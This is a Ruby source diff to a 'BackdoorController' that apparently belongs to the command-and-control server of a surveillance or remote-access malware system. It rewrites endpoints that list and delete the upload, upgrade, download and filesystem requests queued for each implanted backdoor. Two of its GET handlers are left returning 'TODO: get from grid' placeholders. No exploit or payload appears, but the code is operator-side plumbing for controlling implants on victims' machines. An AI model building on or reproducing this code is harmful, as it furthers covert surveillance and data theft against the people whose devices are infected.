@@ -52,7 +52,7 @@ class BackdoorController < RESTController
 
 
   def config
-    backdoor = Item.where({_kind: 'backdoor', _mid: params['backdoor'].to_i}).first
+    backdoor = Item.where({_kind: 'backdoor', _id: params['backdoor']}).first
 
     case @req_method
       when 'GET'
@@ -81,8 +81,8 @@ class BackdoorController < RESTController
   def uploads
     require_auth_level :server, :tech
 
-    #TODO: implement this
-    list = [] #DB.instance.backdoor_uploads(params['backdoor'])
+    backdoor = Item.where({_kind: 'backdoor', _id: params['backdoor']}).first
+    list = backdoor.upload_requests
 
     return STATUS_OK, *json_reply(list)
   end
@@ -95,11 +95,13 @@ class BackdoorController < RESTController
 
     case @req_method
       when 'GET'
-        upload = DB.instance.backdoor_upload(request['backdoor_id'], request['upload_id'])
+        #TODO: get from grid
+        upload = {:content => 'TODO: get from grid'}
         trace :info, "[#{@req_peer}] Requested the UPLOAD #{request} -- #{upload[:content].size.to_s_bytes}"
         return STATUS_OK, upload[:content], "binary/octet-stream"
       when 'DELETE'
-        DB.instance.backdoor_del_upload(request['backdoor_id'], request['upload_id'])
+        backdoor = Item.where({_kind: 'backdoor', _id: request['backdoor_id']}).first
+        backdoor.upload_requests.destroy_all(conditions: { _id: request['upload_id']})
         trace :info, "[#{@req_peer}] Deleted the UPLOAD #{request}"
     end
 
@@ -110,8 +112,8 @@ class BackdoorController < RESTController
   def upgrades
     require_auth_level :server, :tech
 
-    #TODO: implement this
-    list = [] #DB.instance.backdoor_upgrades(params['backdoor'])
+    backdoor = Item.where({_kind: 'backdoor', _id: params['backdoor']}).first
+    list = backdoor.upgrade_requests
 
     return STATUS_OK, *json_reply(list)
   end
@@ -124,11 +126,13 @@ class BackdoorController < RESTController
 
     case @req_method
       when 'GET'
-        upgrade = DB.instance.backdoor_upgrade(request['backdoor_id'], request['upgrade_id'])
+        #TODO: get from grid
+        upgrade = {:content => 'TODO: get from grid'}
         trace :info, "[#{@req_peer}] Requested the UPGRADE #{request} -- #{upgrade[:content].size.to_s_bytes}"
         return STATUS_OK, upgrade[:content], "binary/octet-stream"
       when 'DELETE'
-        DB.instance.backdoor_del_upgrades(request['backdoor_id'])
+        backdoor = Item.where({_kind: 'backdoor', _id: request['backdoor_id']}).first
+        backdoor.upgrade_requests.destroy_all
         trace :info, "[#{@req_peer}] Deleted the UPGRADE #{request}"
     end
 
@@ -139,8 +143,8 @@ class BackdoorController < RESTController
   def downloads
     require_auth_level :server, :tech
 
-    #TODO: implement this
-    list = [] #DB.instance.backdoor_downloads(params['backdoor'])
+    backdoor = Item.where({_kind: 'backdoor', _id: params['backdoor']}).first
+    list = backdoor.download_requests
 
     return STATUS_OK, *json_reply(list)
   end
@@ -152,7 +156,8 @@ class BackdoorController < RESTController
 
     case @req_method
       when 'DELETE'
-        DB.instance.backdoor_del_download(request['backdoor_id'], request['download_id'])
+        backdoor = Item.where({_kind: 'backdoor', _id: request['backdoor_id']}).first
+        backdoor.download_requests.destroy_all(conditions: { _id: request['download_id']})
         trace :info, "[#{@req_peer}] Deleted the DOWNLOAD #{request}"
     end
 
@@ -163,8 +168,8 @@ class BackdoorController < RESTController
   def filesystems
     require_auth_level :server, :tech
 
-    #TODO: implement this
-    list = [] #DB.instance.backdoor_filesystems(params['backdoor'])
+    backdoor = Item.where({_kind: 'backdoor', _id: params['backdoor']}).first
+    list = backdoor.filesystem_requests
 
     return STATUS_OK, *json_reply(list)
   end
@@ -176,7 +181,8 @@ class BackdoorController < RESTController
 
     case @req_method
       when 'DELETE'
-        DB.instance.backdoor_del_filesystem(request['backdoor_id'], request['filesystem_id'])
+        backdoor = Item.where({_kind: 'backdoor', _id: request['backdoor_id']}).first
+        backdoor.filesystem_requests.destroy_all(conditions: { _id: request['filesystem_id']})
         trace :info, "[#{@req_peer}] Deleted the FILESYSTEM #{request}"
     end
     
